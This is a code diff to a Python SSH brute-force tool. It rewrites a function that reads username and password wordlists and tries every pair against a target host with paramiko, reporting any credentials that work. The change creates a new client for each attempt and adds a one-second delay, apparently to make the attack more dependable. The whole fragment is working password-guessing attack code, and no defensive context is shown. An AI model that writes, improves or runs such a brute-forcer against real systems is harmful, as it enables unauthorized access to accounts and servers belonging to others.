@@ -26,9 +26,7 @@ print("""\033[96m
 
 
 def ssh_bruteforce(target_ip, target_port, username_wordlist, password_wordlist):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
+    
     # Open the username and password wordlists
     with open(username_wordlist, 'r') as ufile, open(password_wordlist, 'r') as pfile:
         usernames = ufile.readlines()
@@ -42,6 +40,9 @@ def ssh_bruteforce(target_ip, target_port, username_wordlist, password_wordlist)
             print(f"\033[94mTrying username: {username}, password: {password}\033[0m")
 
             try:
+                client = paramiko.SSHClient()
+                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                time.sleep(1)
                 client.connect(hostname=target_ip, port=target_port, username=username, password=password, timeout=1, allow_agent=False, look_for_keys=False)
                 print(f"\033[93mSuccess! Username: {username}, Password: {password}\033[0m")
                 return username, password
